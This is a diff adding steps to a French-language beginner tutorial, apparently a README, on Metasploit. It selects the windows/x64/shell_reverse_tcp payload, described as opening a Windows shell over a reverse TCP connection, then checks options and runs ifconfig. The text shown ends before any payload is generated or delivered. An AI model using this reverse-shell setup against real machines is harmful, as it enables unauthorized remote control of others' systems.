@@ -97,5 +97,27 @@ simple description
 ### commande a taper :
 
 ````bash
-use playload/
-y
+use PAYLOAD/
+````
+
+### vous verrer des millier de champs qui vous ferront mal au crane (oui j ai eut mal -__-)
+
+taper just cette commande :
+
+````bash
+use payload/windows/x64/shell_reverse_tcp
+````
+il va creer  un shell Windows via une connexion TCP inverse.
+
+puis : 
+
+````bash
+options
+````
+ouvrez un nouveau terminal et taper :
+
+````bash
+ifconfig
+````
+<img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/a7ac75af-2cea-4be0-bde2-e76bb0a98350" />
+
